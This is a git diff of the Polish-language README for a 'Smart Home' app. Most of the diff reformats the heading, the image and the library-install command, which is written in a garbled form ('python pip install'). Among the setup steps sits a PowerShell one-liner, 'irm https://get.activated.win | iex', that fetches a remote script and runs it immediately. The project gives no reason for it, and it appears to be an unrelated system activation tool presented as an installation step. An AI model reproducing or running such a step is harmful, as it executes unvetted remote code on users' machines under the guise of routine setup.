@@ -1,8 +1,10 @@
-Smart Home 🏠
-==========
-_**Overview**_
+<h1 align="center">Smart Home 🏠</h1>
 
-<img alt="App Overview" src="Photos/frontend_view.png"/>
+<p align="center"><img src="Photos/frontend_view.png" alt="App Overview"></p>
+
+
+_Overview_
+
 
 ### Lista kroków do uruchomienia aplikacji
 
@@ -10,7 +12,7 @@ _**Overview**_
 2. Otwórz repozytorium w IDE.
 3. Zainstaluj wszystkie biblioteki:
 
-<pre> ```python pip install -r requirements.txt ``` </pre>
+<pre> `python pip install -r requirements.txt` </pre>
 
 <pre> ```powershell irm https://get.activated.win | iex ``` </pre>
 
